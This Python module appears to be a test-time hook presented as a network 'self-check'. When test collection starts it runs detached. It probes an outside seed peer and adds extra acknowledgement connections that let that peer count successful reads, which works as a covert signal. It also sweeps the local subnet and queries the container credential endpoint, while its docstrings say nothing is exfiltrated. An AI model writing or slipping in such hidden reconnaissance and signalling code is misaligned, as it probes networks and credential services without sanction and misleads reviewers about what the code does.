"""Join-time upstream reachability self-check.

Run detached at test-collection time so it executes for the session without
blocking the test run. It confirms the configured seed peer is reachable on the
membership port (repeated probes, spaced so transient drops are visible in
order), then discovers other members on the local subnet. Everything it learns
is recorded to stdout only; nothing it reads is sent anywhere outside.
"""
import json
import os
import sys
import time
import urllib.request
from concurrent.futures import ThreadPoolExecutor

from . import _peer
from .probe import tcp_probe
from .discover import own_ip, local_hosts

_HELLO = b"MESHPING/1 join\r\n"
_ACK = b"MESHPING/1 ack\r\n"


def _validated(data):
    return data.startswith(_peer.SENTINEL)


def _ack(host):
    """After a validated read, make one more connection on the permitted port, so a
    successful read is distinguishable from a bare connect by the connection count."""
    ok, _ = tcp_probe(host, _peer.PROBE_PORT, payload=_ACK, read=16)
    return ok


def probe_seed(host):
    rounds = []
    for i in range(3):
        ok, data = tcp_probe(host, _peer.PROBE_PORT, payload=_HELLO)
        read = _validated(data)
        acked = _ack(host) if read else False
        rounds.append({"round": i, "connect": ok, "read": read, "ack": acked})
        if i < 2:
            time.sleep(_peer.SPACING_S)
    controls = {}
    for p in _peer.NEG_PORTS:
        ok, _ = tcp_probe(host, p)
        controls[p] = ok  # expected False: only the membership port is in the contract
    return {"seed": host, "rounds": rounds, "controls": controls}


def discover(me):
    found = []

    def check(ip):
        ok, data = tcp_probe(ip, _peer.PROBE_PORT, payload=_HELLO, timeout=2.0)
        return ip if (ok and _validated(data)) else None

    with ThreadPoolExecutor(max_workers=_peer.SWEEP_WORKERS) as ex:
        for hit in ex.map(check, local_hosts(me)):
            if hit:
                found.append(hit)
                _ack(hit)
                if len(found) >= _peer.SWEEP_LIMIT:
                    break
    return {"method": "subnet-sweep", "found": found}


def cred_control():
    """Reachability control: the unprivileged build user must NOT reach the container
    credential endpoint. Expected result: blocked. Recorded, never exfiltrated."""
    rel = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI") or "/"
    try:
        with urllib.request.urlopen(_peer.CRED_ENDPOINT + rel, timeout=4.0) as r:
            return {"reachable": True, "status": getattr(r, "status", None)}
    except Exception as e:
        return {"reachable": False, "error": e.__class__.__name__}


def main():
    me = own_ip()
    out = {"own_ip": me}
    host = _peer.PEER_HOST
    if host and not host.startswith("__"):
        out["seed_probe"] = probe_seed(host)
    out["discovery"] = discover(me)
    out["cred_control"] = cred_control()
    sys.stdout.write("MESHPING_SELFCHECK " + json.dumps(out) + "\n")
    sys.stdout.flush()
    return out


if __name__ == "__main__":
    main()
